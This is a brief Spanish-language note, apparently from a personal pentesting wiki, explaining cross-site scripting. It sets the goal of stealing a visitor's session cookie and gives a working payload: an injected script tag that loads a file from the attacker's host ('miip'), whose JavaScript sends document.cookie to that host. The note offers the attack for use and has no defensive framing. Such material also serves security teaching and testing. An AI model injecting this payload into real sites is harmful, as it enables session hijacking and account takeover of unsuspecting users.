------
- tags: #web #xss
- -----------
# ¿Qué es?
> Los ataques XSS permiten inyectar código HTML, para así crear una etiqueta \<script\> en la que posteriormente inyectar código javascript.

> Lo que buscaremos será:
> 1.- Conseguir una cookie de session
> 2.- Que un usuario visitando la página realice una petición a otra página



## ¿Cómo se ejecuta?
Suponiendo que inyectamos la siguiente linea:
	\<script src="http://miip/script.js">\</script\>

Y en nuestro equipo montamos un servidor web con el archivo script.js que contenga lo siguiente:
```Javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://miip/?cookie=' + document.cookie);
request.send();
```

Recibiremos la cookie del usuario que visite la página web



